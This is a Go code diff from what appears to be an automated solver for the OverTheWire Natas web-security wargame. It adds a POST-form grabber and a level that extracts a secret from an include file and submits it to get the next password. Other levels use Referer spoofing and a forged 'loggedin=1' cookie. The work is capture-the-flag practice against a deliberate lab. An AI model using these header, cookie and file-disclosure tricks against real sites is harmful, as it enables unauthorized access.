@@ -70,6 +70,35 @@ func (h Headers) Grab(r http.Request) (string, error) {
 	return h.Grabber.Grab(r)
 }
 
+type Post struct {
+	Grabber
+	Data url.Values
+}
+
+func (p Post) Grab(r http.Request) (string, error) {
+	m := memio.Buffer(p.Data.Encode())
+	r.Body = &m
+	r.Method = http.MethodPost
+	r.ContentLength = int64(len(m))
+	h := Headers{p.Grabber, http.Header{"Content-Type": []string{"application/x-www-form-urlencoded"}}}
+	return h.Grab(r)
+}
+
+type SetPost struct {
+	Post
+	Grabber
+	Key string
+}
+
+func (s SetPost) Grab(r http.Request) (string, error) {
+	d, err := s.Grabber.Grab(r)
+	if err != nil {
+		return "", nil
+	}
+	s.Data.Set(s.Key, d)
+	return s.Post.Grab(r)
+}
+
 var levels = [...]Grabber{
 	Prefixed{"The password for natas1 is ", 32},
 	Prefixed{"The password for natas2 is ", 32},
@@ -77,6 +106,7 @@ var levels = [...]Grabber{
 	Path{Prefixed{"natas4:", 32}, "/s3cr3t/users.txt"}, // robots.txt references /s3cr3t/, find users.txt
 	Headers{Prefixed{"The password for natas5 is ", 32}, http.Header{"Referer": []string{"http://natas5.natas.labs.overthewire.org/"}}},
 	Headers{Prefixed{"The password for natas6 is ", 32}, http.Header{"Cookie": []string{"loggedin=1"}}},
+	SetPost{Post{Prefixed{"The password for natas7 is ", 32}, url.Values{"submit": []string{"Submit Query"}}}, Path{Prefixed{"$secret = \"", 19}, "/includes/secret.inc"}, "secret"},
 }
 
 func main() {
